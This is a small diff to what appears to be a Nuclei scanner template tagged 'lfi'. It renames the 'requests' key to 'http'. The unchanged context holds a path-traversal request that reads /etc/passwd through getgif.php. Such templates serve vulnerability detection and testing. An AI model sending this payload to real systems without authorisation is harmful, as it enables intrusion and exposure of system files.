@@ -9,7 +9,7 @@ info:
   tags: lfi
 
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
